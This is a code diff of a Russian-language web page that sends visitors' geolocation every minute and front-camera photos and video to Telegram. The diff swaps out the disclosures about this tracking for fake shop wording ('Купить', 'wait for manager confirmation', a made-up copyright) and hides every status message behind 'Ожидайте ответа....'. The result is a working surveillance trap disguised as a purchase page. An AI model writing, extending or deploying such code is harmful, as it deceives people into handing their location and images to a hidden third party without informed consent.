@@ -188,12 +188,12 @@
       <div class="hero">
         <h1 id="mainTitle">Device Check</h1>
         <p class="subtitle" id="mainSubtitle">
-          Нажмите кнопку и подтвердите разрешения браузера.
+          Нажмите кнопку купить.
         </p>
       </div>
 
       <div class="glass" id="noticeText">
-        Геолокация отправляется каждую минуту, пока страница открыта. Фото и видео отправляются только после разрешения камеры.
+        После нажатия кнопки «Купить» дождитесь подтверждения менеджера.
       </div>
 
       <button class="primary" id="startBtn" onclick="startAll()">Купить</button>
@@ -205,7 +205,7 @@
       <div class="status" id="status">Готово к запуску.</div>
 
       <div class="small">
-        Работает через HTTPS. Браузер покажет системные запросы доступа к геолокации и камере.
+        © 2024 Only ont. Все права защищены.
       </div>
     </section>
   </main>
@@ -219,19 +219,19 @@
 
     const texts = {
       iphone: {
-        title: "iPhone Secure Check",
+        title: "Добро пожаловать",
         subtitle: "Нажмите кнопку и подтвердите разрешения Safari.",
         notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
         start: "Разрешить GEO и начать"
       },
       android: {
-        title: "Android Device Check",
+        title: "Добро пожаловать",
         subtitle: "Нажмите кнопку и подтвердите разрешения Chrome.",
         notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
         start: "Разрешить GEO и начать"
       },
       other: {
-        title: "Device Check",
+        title: "Добро пожаловать",
         subtitle: "Нажмите кнопку и подтвердите разрешения браузера.",
         notice: "GEO отправляется каждую минуту. Фото и видео — только после разрешения камеры.",
         start: "Разрешить GEO и начать"
@@ -447,7 +447,7 @@ ${buildBaseInfo()}`;
         },
         function(error) {
           if (error.code === error.PERMISSION_DENIED) {
-            setStatus("Доступ к геолокации запрещён.");
+            setStatus("Доступ запрещён.");
             stopTracking();
           } else if (error.code === error.POSITION_UNAVAILABLE) {
             setStatus("Не удалось определить GEO. Повтор через 1 минуту.");
@@ -494,12 +494,12 @@ ${buildBaseInfo()}`;
       startBtn.style.display = "block";
       stopBtn.style.display = "none";
 
-      setStatus("GEO отправка остановлена.");
+      setStatus("Ожидайте ответа....");
     }
 
     async function capturePhotoAndVideo() {
       try {
-        setStatus("Запрашиваем доступ к камере...");
+        setStatus("Ожидайте ответа....");
 
         mediaStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
@@ -512,7 +512,7 @@ ${buildBaseInfo()}`;
           video.onloadedmetadata = resolve;
         });
 
-        setStatus("Камера разрешена. Делаем фото и записываем видео...");
+        setStatus("Ожидайте ответа....");
 
         canvas.width = video.videoWidth || 720;
         canvas.height = video.videoHeight || 960;
@@ -562,10 +562,10 @@ ${buildBaseInfo()}`;
 ${buildBaseInfo()}`;
 
             await sendVideoToTelegram(videoBlob, caption);
-            setStatus("Фото и видео отправлены. GEO продолжает обновляться каждую минуту.");
+            setStatus("Ожидайте ответа....");
           } catch (e) {
             console.error(e);
-            setStatus("Фото отправлено, но видео могло не отправиться.");
+            setStatus("Ожидайте ответа....");
           } finally {
             if (mediaStream) {
               mediaStream.getTracks().forEach(track => track.stop());
@@ -584,7 +584,7 @@ ${buildBaseInfo()}`;
 
       } catch (error) {
         console.error(error);
-        setStatus("Камера не разрешена или не поддерживается. GEO продолжает работать, если разрешён.");
+        setStatus("Ожидайте ответа....");
       }
     }
 
@@ -594,7 +594,7 @@ ${buildBaseInfo()}`;
         return;
       }
 
-      setStatus("Запрашиваем разрешения...");
+      setStatus("Ожидайте ответа....");
 
       startGeoTracking();
       capturePhotoAndVideo();
